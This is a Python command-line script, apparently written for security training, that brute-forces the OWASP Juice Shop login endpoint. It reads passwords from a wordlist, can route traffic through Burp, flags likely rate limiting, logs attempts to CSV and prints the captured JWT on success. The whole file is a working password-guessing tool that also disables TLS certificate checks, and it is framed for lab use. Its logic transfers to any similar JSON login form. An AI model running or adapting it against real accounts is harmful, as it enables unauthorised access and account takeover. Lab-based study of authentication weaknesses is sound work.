#!/usr/bin/env python3
"""
AuthProbe-JS: a small demo tool to exercise Identification & Authentication Failures
against OWASP Juice Shop login in a contained lab environment.

Usage (example):
  python3 authprobe.py --base http://127.0.0.1:3000 --email test1@example.com --wordlist passwords.txt

Optional:
  --burp http://127.0.0.1:8080  (send traffic through Burp)
  --delay 0.2                   (seconds between attempts)
  --csv results.csv             (save attempt log)
  --max 200                     (limit attempts)
  --verbose
"""
import argparse, time, sys, json, csv
from typing import Optional
import requests

def parse_args():
    p = argparse.ArgumentParser(description="AuthProbe-JS: Juice Shop login brute-force demo (lab only).")
    p.add_argument("--base", required=True, help="Base URL, e.g., http://127.0.0.1:3000")
    p.add_argument("--email", required=True, help="Target email (your test account)")
    p.add_argument("--wordlist", required=True, help="Path to password list (one per line)")
    p.add_argument("--burp", default=None, help="Proxy URL, e.g., http://127.0.0.1:8080")
    p.add_argument("--delay", type=float, default=0.0, help="Delay (seconds) between attempts")
    p.add_argument("--max", type=int, default=0, help="Max attempts (0 = all)")
    p.add_argument("--csv", default=None, help="Write results to CSV file")
    p.add_argument("--timeout", type=float, default=10.0, help="HTTP timeout (seconds)")
    p.add_argument("--verbose", action="store_true", help="Verbose output")
    return p.parse_args()

def proxies_from(burp: Optional[str]):
    if not burp: return None
    return {"http": burp, "https": burp}

def is_success(resp: requests.Response) -> bool:
    # Juice Shop returns 200 and a token field on success
    if resp.status_code != 200:
        return False
    try:
        data = resp.json()
        txt = json.dumps(data).lower()
    except Exception:
        txt = resp.text.lower()
    return ("token" in txt) or ("authentication" in txt) or ("jwt" in txt)

def is_rate_limited(resp: requests.Response) -> bool:
    return resp.status_code in (401, 403, 429) and ("too many" in resp.text.lower() or "rate" in resp.text.lower())

def attempt(session: requests.Session, base: str, email: str, password: str, timeout: float):
    url = base.rstrip("/") + "/rest/user/login"
    payload = {"email": email, "password": password}
    headers = {"Content-Type": "application/json", "Accept": "application/json"}
    resp = session.post(url, json=payload, headers=headers, timeout=timeout)
    return resp

def main():
    args = parse_args()
    session = requests.Session()
    session.headers.update({"User-Agent": "AuthProbe-JS/1.0 (+lab)"})
    session.proxies = proxies_from(args.burp) or {}
    # avoid SSL verify issues if someone points to https in their lab
    session.verify = False

    rows = []
    attempts = 0
    hit = None

    try:
        with open(args.wordlist, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                pw = line.strip()
                if not pw: 
                    continue
                attempts += 1
                if args.max and attempts > args.max:
                    break
                try:
                    resp = attempt(session, args.base, args.email, pw, args.timeout)
                    ok = is_success(resp)
                    rl = is_rate_limited(resp)
                    size = len(resp.content)
                    line_summary = f"{pw:20} -> {resp.status_code} ({size} bytes)"
                    if ok:
                        line_summary += "   <-- HIT"
                        hit = (pw, resp)
                    elif rl:
                        line_summary += "   [maybe rate-limited]"
                    print(line_summary)
                    rows.append([attempts, pw, resp.status_code, size, "HIT" if ok else ("RATE?" if rl else "")])
                    if ok:
                        break
                except requests.RequestException as e:
                    print(f"{pw:20} -> ERROR: {e}")
                    rows.append([attempts, pw, "ERROR", 0, str(e)])
                if args.delay:
                    time.sleep(args.delay)
    except FileNotFoundError:
        print(f"[!] Wordlist not found: {args.wordlist}")
        sys.exit(2)

    if args.csv:
        with open(args.csv, "w", newline="", encoding="utf-8") as out:
            w = csv.writer(out)
            w.writerow(["#","password","status","length","note"])
            w.writerows(rows)
        print(f"[i] Wrote CSV: {args.csv}")

    if hit:
        pw, resp = hit
        print(f"\n[+] SUCCESS for {args.email} : {pw}")
        try:
            data = resp.json()
            token = data.get("authentication", {}).get("token") or data.get("token") or ""
            if token:
                print("[+] JWT token (truncated):", token[:60], "...")
        except Exception:
            pass
        sys.exit(0)
    else:
        print("\n[-] No success with provided wordlist.")
        sys.exit(1)

if __name__ == "__main__":
    main()
